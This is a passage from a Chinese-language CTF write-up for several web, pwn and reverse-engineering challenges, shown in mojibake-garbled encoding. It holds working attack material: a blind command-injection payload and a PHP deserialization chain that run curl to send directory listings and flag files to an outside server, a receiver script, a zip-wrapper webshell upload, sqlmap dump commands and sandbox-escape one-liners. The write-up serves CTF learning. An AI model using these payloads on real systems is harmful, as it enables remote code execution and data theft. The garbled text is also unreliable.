ä¸ºçœ‹æ³¨é‡Šä¼°è®¡ä¼šä»¥ä¸ºç”¨xssæˆ–è€…xxeï¼Œç„¶è€Œå®é™…å¹¶éå¦‚æ­¤ã€‚å¤§æ¦‚æœ‰ä¸¤ä¸ªåšæ³•ï¼Œåœ¨æ²¡æœ‰å…³é—­tempå‰ï¼Œåˆ©ç”¨wgetä¼ ä¸€å¥è¯ï¼Œæˆ‘æƒ³åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œè¿™ç§åŠæ³•å¯èƒ½æ˜¯æœ€ç®€å•çš„ï¼Œä½†å› ä¸ºæŸäº›åŸå› æˆ‘å¹¶æœªèƒ½å¤Ÿå°è¯•ï¼Œæˆ‘é‡‡ç”¨blind command injectionæ–¹æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œçœ‹ä¸åˆ°ç»“æœçš„æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è¦çš„åˆ°æ ¹ç›®å½•çš„flagè‚¯å®šéœ€è¦çŸ¥é“æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹åˆ†å¸ƒçš„æƒ…å†µï¼Œè€Œè¿™æ˜¯éœ€è¦å›æ˜¾ä¿¡æ¯çš„ï¼Œä¸ç„¶ä½ æƒ³ä½ å…‰æ‰§è¡Œ ls ../../../../å‡ºäº†ç»“æœä½ ä¹Ÿçœ‹ä¸åˆ°å¯¹å§ã€‚æ‰€ä»¥éœ€è¦æŠŠæ‰§è¡Œç»“æœæƒ³åŠæ³•è®©æˆ‘ä»¬çœ‹åˆ°ã€‚å¯æ˜¯execç›¸å½“äºæ‰§è¡Œäº†Linuxç³»ç»ŸShellï¼Œlså‘½ä»¤è¾“å‡ºä½ç½®æ˜¯stdoutï¼Œè€Œä¸æ˜¯æµè§ˆå™¨ä¸Šçš„echoï¼Œæ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªåŠæ³•æ„é€ payload:?dirname=;curl â€“data â€œdir=$(ls -la ../../../)â€ <a href="http://xxx.xxx.xxx.xxx/curl.php">http://xxx.xxx.xxx.xxx/curl.php</a>ï¼Œç›¸å½“äºæŠŠls ../../../../ POSTåˆ°æˆ‘ä»¬æœåŠ¡å™¨ä¸Šï¼Œåœ¨æœåŠ¡ç«¯curl.php</p><pre><code>&lt;?phpif(isset ($_POST[&#39;dir&#39;]))&#123;    $output= $_POST[&#39;dir&#39;];    file_put_contents(&quot;output.txt&quot;,$output);&#125;?&gt;</code></pre><p>è¿™æ ·åœ¨output.txtå°±èƒ½è¾“å‡ºå¯¹åº”POSTè¿‡æ¥çš„æ•°æ®äº†ï¼Œå¾—åˆ°çš„æ•°æ®å¤§æ¦‚ä¼šæ˜¯è¿™æ ·</p><p><img src="http://106.15.74.181/wp-content/uploads/2020/11/1.png"></p><p>ä¸€ç›®äº†ç„¶ï¼Œçœ‹åˆ°flagä½ç½®ï¼Œè¿™ä¹Ÿå°±æ¯”è¾ƒå¥½ç†è§£æˆ‘ä»¬ç›´æ¥åˆ©ç”¨?dirname=../../../../../åªèƒ½çœ‹åˆ°ä¸€ä¸ªbashè„šæœ¬çš„åŸå› äº†ï¼Œflagæ˜¯åœ¨ä¸€ä¸ªç›®å½•é‡Œï¼Œå…¶å®è¿™ä¹Ÿæœ‰ç‚¹å°å‘ï¼Œæç¤ºè¯´flagåœ¨æ ¹ç›®å½•é‡Œï¼Œå®é™…åœ¨æ ¹ç›®å½•ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œï¼Œazã€‚å¦å¤–è¿™é‡Œå¯èƒ½é‡åˆ°ä¸€ä¸ªå‘ï¼Œå¦‚æœä½ ç”¨contents=$(ls ../../../../../../../../);curl <a href="http://xxx.xxx.xxx.xxx/curl.php?contents=">http://xxx.xxx.xxx.xxx/curl.php?contents=</a>$contentsï¼Œåªä¼šå¾—åˆ°binï¼Œè¿™æ˜¯å› ä¸ºexecé»˜è®¤åªè¿”å›æœ€åä¸€è¡Œæ‰§è¡Œç»“æœï¼ŒåŒç†curl <a href="http://xxx.xxx.xxx.xxx/">http://xxx.xxx.xxx.xxx/</a>`ls` æœ€ç»ˆä¹Ÿåªèƒ½å¾—åˆ°binï¼Œè¿™é‡Œæ¶‰åŠä¸€ç‚¹shellçŸ¥è¯† ` ` ä¼šæŠŠåŒ…åœ¨å…¶ä¸­å†…å®¹å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œå¦‚æœâ€™ â€˜ç®¡é“ç¬¦æ²¡è¢«ç¦ç”¨ï¼Œå¯ä»¥é‡å®šå‘lsç»“æœå°†å…¶ä½œä¸ºbase64åŠ å¯†è¾“å…¥å†…å®¹è¿›è¡ŒåŠ å¯†åä¼ è¾“ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å¾—åˆ°æ­£ç¡®ç»“æœï¼Œå½“ç„¶è¿™å°±æ˜¯å±äºé¢˜å¤–è¯äº†ã€‚æœ€ç»ˆè¿›å…¥ç›®å½•ç”¨listsource.phpå¾—åˆ°å…¶å†…å®¹ï¼Œæˆ–è€…ç…§è‘«èŠ¦ç”»ç“¢ç”¨exec æ‰§è¡Œcatå¹¶è¿”å›ç»“æœã€‚æ¬¡é¢˜è¿˜æ¶‰åŠä¸€ä¸ªå°çŸ¥è¯†ç‚¹Linuxä¸­â€™ ../ â€˜ç›¸å½“äºè¿”å›ä¸Šçº§ç›®å½•â€™ ./ â€˜åˆ™ä»£è¡¨å½“ä¸‹ç›®å½•â€™ / â€˜ä»£è¡¨æ ¹ç›®å½• SYC{Mak3_ZXT_sh*t_4oreVer}</p><h3 id="Web-Longlone"><a href="#Web-Longlone" class="headerlink" title="Web-Longlone"></a>Web-Longlone</h3><p>è§£è¿™é¢˜æ­¥éª¤å¤§æ¦‚å¯ä»¥æ€»ç»“ä¸ºï¼šæ‹¿æºç â€“&gt;ä»£ç å®¡è®¡â€“&gt;sessionç¯¡æ”¹â€“&gt;ä¸Šä¼ å›¾ç‰‡é©¬â€“&gt;zipä¼ªåè®®è¯»å–â€“&gt;èšå‰‘é“¾æ¥â€“&gt;åœ¨æ ¹ç›®å½•æ‰¾åˆ°flag</p><p>é¦–å…ˆæ¥è¯´æ‹¿æºç ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯çœ‹åˆ°fileï¼ŒpageåŠ ç­‰äºå·è¯»é¡µé¢æƒ³åˆ°ä¼ªåè®®ï¼Œåˆ©ç”¨è€å¥—è·¯php://filter/convert.base64-encode/resource=xxxæ‹¿åˆ°å„ä¸ªé¡µé¢æºç ï¼Œè¿™é‡Œæœ‰ä¿©å‘ç‚¹ï¼Œä¸€ä¸ªæ˜¯xxxåä¸åŠ .phpå› ä¸ºåœ¨indexä¸­ç»™è¡¥å…¨äº†å°¾ç¼€.phpè¿™ç‚¹å¾ˆé‡è¦åœ¨åç»­zipæµè°ƒç”¨å›¾ç‰‡é©¬ä¸­å½±å“å¾ˆå¤§ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯æ‹¿åˆ°é¡µé¢æºç ï¼Œå…¶ä¸­admin/useræ˜¯éœ€è¦åœ¨login.phpçœ‹ä¸€ä¸‹ç™»å½•æ¡†actionä¸­å¾—åˆ°ï¼Œè¿™é‡Œé¢ä¸œè¥¿æœ‰ç‚¹å¤šå¯èƒ½ä¸€æ—¶é—´è„‘å­ç³Šäº†ï¼Œæ²¡æ‰¾åˆ°ã€‚</p><p>æ‹¿åˆ°æºç äº†ï¼Œå®¡è®¡å¼€å§‹å‘—ï¼Œå…ˆçœ‹PHPéƒ¨åˆ†ï¼Œæˆ‘ä»¬æœ€å…³å¿ƒçš„è‚¯å®šæ˜¯å¦‚ä½•è¿›åå°ï¼Œé˜…è¯»åå¾—çŸ¥ç”¨æˆ·åæ˜¯å®šæ­»çš„Longloneå¯†ç åˆ™æ˜¯ç”±mt19937ç”Ÿæˆçš„é«˜è´¨é‡éšæœºæ•°ï¼Œä½ æƒ³æ­£é¢æ‹¿ä¸‹ï¼Ÿä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥ä¹–ä¹–æƒ³åŠæ³•ç»•è¿‡ï¼Œè¿™é‡Œæ¶‰åŠçš„çŸ¥è¯†ç‚¹å°±æ˜¯å¦‚æœæºå¸¦çš„SSIDæœåŠ¡å™¨æ²¡å¾—ï¼Œé‚£å°±è¿”å›ç©ºï¼Œç”¨SSIDå­˜çš„å¯†ç å’Œè¾“å…¥çš„å¯†ç æ¯”è¾ƒï¼Œåªè¦æˆ‘ä»¬ç¯¡æ”¹SSIDä¾‹å¦‚æ”¹æˆ10086ï¼Œå¯†ç ä¸ºç©ºä¾¿èƒ½è¿›åå°ï¼Œè¿™é‡Œç›´æ¥ä¸è¾“å…¥å¯†ç æ˜¯ä¸è¡Œçš„ï¼Œè¿‡ä¸äº†å‰ç«¯æ£€æµ‹ï¼Œæˆ‘ä»¬ç›´æ¥æŠ“åŒ…ä¿®æ”¹åæˆåŠŸç™»å…¥.</p><p>è¿›å…¥åå°æ˜ å…¥çœ¼å¸˜çš„ä¾¿æ˜¯æµªçˆ·é«˜äºŒåšçš„è¯—ï¼Œå¦‚æ­¤ç¾å¦™ï¼Œæœç„¶ä½œè¯—æ‰æ˜¯æµªçˆ·ä¸»ä¸šï¼Œwebåªæ˜¯ä¸€ä¸ªå°çˆ±å¥½è€Œå·²ã€‚</p><blockquote><p>é›ªé›€ä½é¸£,äºå±±æ¶§æ—©,å‰é›ªåˆç­.èŒ…å±‹è®¾å®´æ— è¶£,ç—´æƒ…å¤„,ç»†é›¨å‚¬ç¦».å›çœ¸å†æœ›å›é¢œ,ç«Ÿæ³ªé›¨äº¤æ¥.å‹¿å¿µå¿µ,ä¸ä¸è—•çº¿,ç™½é›¾æ¸ºæ¸ºæºªæ°´å¯’.è‡ªå¤æµæ°´ä½œå¤šæƒ…,æ€å ªé‚£å‡„å‡„æ— èŠ±åŠ«!ä»Šæœæ¢¦é†’ä½•å¤„?é…’æ–¹å°,ç¿»ç¢—ç¢ç¢Ÿ.å·²æˆæ¡‘ç”°,å³æ˜¯èŠ±å¥½æœˆåœ†ç©ºå¿µ,ä¾¿çºµæœ‰ä¸‡èˆ¬æ€æ„,æ›´ä¸ä½•äººè¯‰?</p></blockquote><p>è¯ä¸å¤šè¯´ï¼ŒæŒ‰zipæµè¦æ±‚ï¼ŒåŒ…å¥½å›¾ç‰‡é©¬ï¼Œè¿™é‡Œç»™ä¸ªä¾‹å­å…ˆåˆ›å»ºä¸€ä¸ªtest.phpé‡Œé¢å†™ä¸Šä¸€å¥è¯shellï¼ŒæŠŠå®ƒå‹æˆtest.zipï¼Œå†æ”¹åç¼€ä¸º.jpgåä¸Šä¼ ï¼Œä¸Šä¼ æ‹¿åˆ°è·¯å¾„ï¼Œä½¿ç”¨ä¼ªåè®®zipæµè¿›è¡Œèšå‰‘è®¿é—®æ ¹ç›®å½•ï¼Œä¾¿å¯ä»¥å¾—åˆ°flagã€‚</p><p>è¿™é‡Œæ³¨æ„ï¼ŒæœåŠ¡ç«¯æ¯åˆ°00æˆ–05ä¾¿ä¼šåˆ é™¤æ–‡ä»¶ï¼Œæ‰‹é€Ÿè¦å¿«ã€‚åŒæ—¶zipæŒ‡å®šè·¯å¾„ä¸ºç»å¯¹è·¯å¾„ï¼Œæ‰€ä»¥payloadå¤§æ¦‚æ˜¯é•¿è¿™æ ·<a href="http://173.82.206.142:8006/index.php?page=zip:///var/www/html/assets/img/upload/b75d98c7dd9b6527440abbdc2efd10452eeac9ea.jpg%23test">http://173.82.206.142:8006/index.php?page=zip:///var/www/html/assets/img/upload/b75d98c7dd9b6527440abbdc2efd10452eeac9ea.jpg%23test</a>ï¼Œzip:///å…¶ä¸­//æ˜¯zip://è§„èŒƒ/varè¡¨ç¤ºæ ¹ç›®å½•ä¸‹çš„varæ–‡ä»¶å¤¹ï¼Œè¿™ä¾¿ä½“ç°äº†zipä¼ªåè®®æµçš„ç»å¯¹è·¯å¾„è¦æ±‚ã€‚SYC{php_15_635t_1@n94a93_1n_th3_w0r1d!}</p><h3 id="Web-å¿æ‚”çš„åˆ˜å£®"><a href="#Web-å¿æ‚”çš„åˆ˜å£®" class="headerlink" title="Web-å¿æ‚”çš„åˆ˜å£®"></a>Web-å¿æ‚”çš„åˆ˜å£®</h3><p>è¿™é¢˜å¯ä»¥æ‰‹åŠ¨ç›´æ¥è¯•å‡ºæ¥ï¼Œæ­£å¦‚å‰é¢Web-3æœ‹å‹çš„å­¦å¦¹ï¼Œå³ä¸‹è§’çš„å¦¹å­è¯´çš„F12æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼ˆå¯¹ç€å¦¹å­ç‚¹ä¸€äº›ä¸è¯¥ç‚¹çš„åœ°æ–¹æœ‰æƒŠå–œdogeï¼‰ï¼ŒF12è½¬åˆ°å‚¨å­˜â€“&gt;ç«™ç‚¹å­˜å‚¨èƒ½çœ‹åˆ°sessionå’Œanswerï¼ŒæŒ‰ç…§cookieä¸­answerå­˜å‚¨çš„é€‰é¡¹ä¾¿å¯ä»¥ç­”å¯¹é¢˜ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯æ¯æ¬¡ç­”å¯¹é¢˜sessionä¼šå˜ï¼Œå¦‚æœç­”é”™ä¹Ÿä¼šå˜å¹¶ä¸”å¯¼è‡´ä½ ç­”å¯¹æ¬¡æ•°å½’é›¶ï¼Œä½†å¦‚æœæ˜¯å› ä¸ºè¶…æ—¶æœªç­”é¢˜sessionä¸ä¼šå˜ï¼Œç­”å¯¹æ¬¡æ•°ä¹Ÿä¸ä¼šå˜ã€‚æ¯æ¬¡è®¿é—®æˆ–åˆ·æ–°do_answeréƒ½ä¼šç»™æ–°çš„answerã€‚æ‰€ä»¥å¦‚æœä½ æ‰‹åŠ¨ç­”é¢˜ï¼Œå®å¯è¶…æ—¶åˆ·æ–°ä¹Ÿä¸è¦ç‚¹é”™äº†è¿˜æäº¤ã€‚æœ€ç»ˆflagçš„sessionä¸ºeyJkb25lX3RpbWVzIjowfQ.X48jxQ._35k1fJ3trPz4iTceUdbnnq7f44ï¼Œé¡µé¢æ˜¯checkï¼Œflagæ˜¯SYC{this_is_your_flag}</p><h3 id="PWN-RunCode"><a href="#PWN-RunCode" class="headerlink" title="PWN-RunCode"></a>PWN-RunCode</h3><p>è®°å¾—æŠŠä»£ç ç¼©è¿›å»æ‰ï¼Œä»£ç éƒ¨åˆ†é™¤å»ä¸å¿…è¦ç©ºæ ¼ã€‚å¦åˆ™æŠ¥é”™ï¼Œéšä¾¿å†™æ®µè¯»æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºå†…å®¹çš„Cä»£ç å³å¯ã€‚æ ·ä¾‹å¦‚ä¸‹</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main()&#123;FILE* fp;char a;fp = fopen(&quot;../../../home/ctf/flag&quot;, &quot;r&quot;);while (!feof(fp))&#123;fscanf(fp, &quot;%c&quot;, &amp;a);printf(&quot;%c&quot;, a);&#125;&#125;</code></pre><p>è½»æ¾æ‹¿åˆ°Flag:SYC{C0din9_ls_E4sy_T0_You}</p><h3 id="Re-WhatsApk"><a href="#Re-WhatsApk" class="headerlink" title="Re-WhatsApk"></a>Re-WhatsApk</h3><p>çœ‹è§APKç¬¬ä¸€ä»¶äº‹å¹²å˜›ï¼Ÿç›´æ¥æ‹–è¿›jebå°±å®Œäº†ï¼Œå¥¥åˆ©ç»™ï¼Œç›´æ¥å…ˆçœ‹çœ‹Manifest flagæœç„¶ä¸å†ï¼Œçœ‹æˆ‘è¿›bytecodeæœç´¢ä¸€ä¸‹SYCï¼Œæˆ‘å»å±…ç„¶æ²¡çš„ï¼Œå†æœflagï¼Œå¥½å®¶ä¼™è¿™ä¹ˆå¤šï¼ŒWDNMDï¼Œæµªè´¹30minåæ— æœï¼Œçœ‹äº†ä¸‹hintï¼Œå®‰å“APKç»“æ„ï¼Œé‚£æˆ‘å°±zipæ‰“å¼€å‘—ï¼Œæœ€åäº§è¿˜æ˜¯æœç´¢SYCï¼Œåœ¨resources.arscä¸­æ‰¾åˆ°flag SYC{WelC0me_to_android!}</p><h3 id="Re-HelloAndroid"><a href="#Re-HelloAndroid" class="headerlink" title="Re-HelloAndroid"></a>Re-HelloAndroid</h3><p>å¥½å®¶ä¼™ï¼Œæˆ‘ç›´æ¥æ‰”è¿›jebï¼Œè¿›bytecodeæœç´¢SYCï¼Œç›´æ¥ç§’æ€SYC{Android_in_Java_is_easy!}</p><h3 id="Web-å¸¦æ¶äººå…­æ’"><a href="#Web-å¸¦æ¶äººå…­æ’" class="headerlink" title="Web-å¸¦æ¶äººå…­æ’"></a>Web-å¸¦æ¶äººå…­æ’</h3><p>sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a></p><p>æ‰«æåˆ°æ³¨å…¥æ–¹å¼1ï¼‰boolean-based blind 2ï¼‰error-based 3ï¼‰time-based blind 4ï¼‰UNION query</p><p>sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a> -b â€“current-db â€“current-user</p><p>å¾—åˆ°ç»“æœ:current user: â€˜root@localhostâ€™ current database: â€˜geek_sqlâ€™</p><p>è¿›è€Œsqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a> -D geek_sql -tables</p><p>å¾—åˆ°ï¼šretrieved: â€˜blogâ€™ retrieved: â€˜fllllagâ€™</p><p>æ­¤æ—¶æˆ‘ä»¬å¾—çŸ¥æ•°æ®åº“åå’Œè¡¨åï¼Œæ¥ä¸‹æ¥å°±æ˜¯çˆ†å†…å®¹</p><p>ä½¿ç”¨:sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a> â€“dump -D geek_sql -T fllllag å¾—åˆ°: id fllllllag 1 welcome_to_syclover 2 longlone_need_gf 3 SYC{liuzhuang_4s_@_G00d_m@n}</p><h3 id="Web-FamilyJailPackage"><a href="#Web-FamilyJailPackage" class="headerlink" title="Web-FamilyJailPackage"></a>Web-FamilyJailPackage</h3><pre><code>You know some birds are not meant to be caged, their feathers just too bright. ---- The Shawshank Redemption</code></pre><p>å…¸å‹æ²™ç®±é€ƒé€¸ï¼Œç¬¬ä¸€å±‚pythoné€ƒé€¸ï¼Œç¬¬äºŒå±‚nodejsé€ƒé€¸ï¼Œç¬¬ä¸‰å±‚fakechrooté€ƒé€¸ï¼Œç¬¬ä¸€ä¸ªç›´æ¥åœ¨freebufæŠ„åˆ«äººæºç </p><pre><code>getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;ls&#39;)getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;cat flag&#39;)ssh nodejs@server.com -p 2222password: nodejsqwqwqwqref:https://www.freebuf.com/articles/network/203208.htmlref:https://www.youtube.com/watch?v=EMYiGC9ZobY</code></pre><p>ç¬¬äºŒä¸ªnodejséš¾åº¦æå¤§ï¼Œæ²¡æ¥è§¦è¿‡ï¼Œå»ç½‘ä¸Šæ‰¾å„ç§å‚è€ƒ</p><p><img src="http://106.15.74.181/wp-content/uploads/2020/11/1-1024x170.jpg"></p><p>çæåæ­£æˆ‘ä¹Ÿä¸å¤ªæ‡‚JSï¼Œå‚è€ƒäº†</p><p>nodejs ref:<a href="https://www.youtube.com/watch?v=-RnGbbIwTa8">https://www.youtube.com/watch?v=-RnGbbIwTa8</a></p><p>æœ€åä¸€ä¸ªï¼Œå…¶å®ä¸éš¾ï¼Œä¸¤è¡Œç§’æ€ï¼Œåªå¯æƒœå®¹æ˜“è®©äººæ‘¸ä¸åˆ°å¤´è„‘ï¼Œä½†æ˜¯ä¹Ÿæœ‰æç¤ºäº†ï¼Œæ–‡ä»¶å«æœ‰fakechroot</p><p>æš´éœ²äº†ç¯å¢ƒä¿¡æ¯</p><pre><code>https://manpages.debian.org/jessie/fakechroot/fakechroot.1.en.htmlhttps://github.com/dex4er/fakechroot/issues/64env ls /env cat /flagSYC&#123;you_r_re@lly_good_at_jailbreaking&#125;</code></pre><h3 id="Web-EpicPOPChain"><a href="#Web-EpicPOPChain" class="headerlink" title="Web-EpicPOPChain"></a>Web-EpicPOPChain</h3><p>è¿™é¢˜ç›´æ¥éé¢„æœŸå¥½å§</p><pre><code>&lt;?php//error_reporting(0);â€‹â€‹class pop&#123;    public $aaa;â€‹    public static $bbb = false;â€‹    public function __wakeup()    &#123;        echo &quot;bypass failure&quot;;        //Do you know CVE?        echo &quot;The class pop should never be serialized.&quot;;        $this-&gt;aaa = NULL;    &#125;â€‹    public function __destruct()    &#123;        echo &quot;i will die\n&quot;;        for ($i=0; $i&lt;2; $i++) &#123; //exec();            var_dump(self::$bbb);            if (self::$bbb) &#123;                echo &quot;i have run the specific func&quot;;                $this-&gt;aaa[1]($this-&gt;aaa[2]);//å¦‚æœbbbä¸ºçœŸ åˆ™æ‰§è¡Œå˜é‡çš„å‡½æ•°æ–¹æ³•            &#125; else &#123;                echo &quot;i have NOT run the specific func&quot;;                self::$bbb = call_user_func($this-&gt;aaa[&quot;object&quot;]);//æ‰§è¡Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°åˆ‡æ— å‚æ•°ä¼ é€’                                                                       //è¿™é‡Œä¸»è¦çš„é—®é¢˜å°±æ˜¯calluserfuncç›¸å½“äºæ˜¯åœ¨å¤–éƒ¨è°ƒç”¨äº†å‡½æ•°                                                                       //è¯´ç™½äº† æ­¤å¤„å°±æ˜¯è¦è°ƒç”¨ getAFKL            &#125;        &#125;    &#125;&#125;â€‹class chain&#123;  â€‹    private $AFKL=true;â€‹    private function getAFKL()    &#123;        echo &quot;i have return true&quot;;        return $this-&gt;AFKL;    &#125;     public function __set($name,$para)    &#123;        $this-&gt;AFKL=$para;    &#125;&#125;â€‹class epic extends chain&#123;    public $aaa;â€‹â€‹    public static $bbb = false;â€‹    public function __invoke()    &#123;        return self::$bbb;    &#125;â€‹    public function __call($name, $params)    &#123;        return $this-&gt;aaa-&gt;$name($params);            &#125;&#125;â€‹if (isset($_GET[&quot;code&quot;])) &#123;    unserialize(base64_decode($_GET[&quot;code&quot;]));&#125; else &#123;   // highlight_file(__FILE__);&#125;â€‹â€‹$a=new pop;â€‹$a-&gt;aaa=array(&quot;1&quot;=&gt;&#39;exec&#39;,&quot;2&quot;=&gt;&#39;curl --data &quot;dir=$(cat ../../../flag)&quot; http://106.15.74.181/curl.php&#39;,&#39;object&#39;=&gt;&#39;time&#39;);echo serialize($a);echo &quot;\n&quot;;â€‹//$b=&#39;O:3:&quot;pop&quot;:2:&#123;s:3:&quot;aaa&quot;;a:3:&#123;i:1;s:4:&quot;exec&quot;;i:2;s:67:&quot;curl --data &quot;dir=$(ls -la ../../../)&quot; http://106.15.74.181/curl.php&quot;;s:6:&quot;object&quot;;s:4:&quot;time&quot;;&#125;&#125;&#39;;$b=&#39;O:3:&quot;pop&quot;:2:&#123;s:3:&quot;aaa&quot;;a:3:&#123;i:1;s:4:&quot;exec&quot;;i:2;s:68:&quot;curl --data &quot;dir=$(cat ../../../flag)&quot; http://106.15.74.181/curl.php&quot;;s:6:&quot;object&quot;;s:4:&quot;time&quot;;&#125;&#125;&#39;;//echo base64_encode($b);//TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjQ6ImV4ZWMiO2k6MjtzOjY3OiJjdXJsIC0tZGF0YSAiZGlyPSQobHMgLWxhIC4uLy4uLy4uLykiIGh0dHA6Ly8xMDYuMTUuNzQuMTgxL2N1cmwucGhwIjtzOjY6Im9iamVjdCI7czo0OiJ0aW1lIjt9fQ==echo base64_encode($b);//TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjQ6ImV4ZWMiO2k6MjtzOjY4OiJjdXJsIC0tZGF0YSAiZGlyPSQoY2F0IC4uLy4uLy4uL2ZsYWcpIiBodHRwOi8vMTA2LjE1Ljc0LjE4MS9jdXJsLnBocCI7czo2OiJvYmplY3QiO3M6NDoidGltZSI7fX0==â€‹</code></pre><p>ä¸»è¦çŸ¥è¯†ç‚¹ call_user_funcè™½ç„¶çœ‹åå­—æ˜¯è°ƒç”¨ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼Œä½†å®é™…ä¸Šè°ƒç”¨ç³»ç»Ÿå†…ç½®å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ‰€ä»¥åˆ©ç”¨timeå€¼ä¸ºæ­£ï¼Œå±äºçœŸï¼Œå°±å¯ä»¥RCEå•¦</p><p>è™½ç„¶å¾ˆç´¯ä½†æ˜¯æ”¶è·ä¸å°ï¼Œä»¥æ­¤WPè®°å½•ç†¬å¤œçš„é‚£æ®µæ—¶é—´</p><p><strong>2020.11.19</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Web-Welcome&quot;&gt;&lt;a href=&quot;#Web-Welcome&quot; class=&quot;headerlink&quot; title=&quot;Web-Welcome&quot;&gt;&lt;/a&gt;Web-Welcome&lt;/h3&gt;&lt;p&gt;è¿™é“é¢˜emmä¼°è®¡ç»™ä¸å°‘é©¬è™çš„äººå½“å¤´ä¸€æ£’ï¼Œè¯¶</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
</feed>
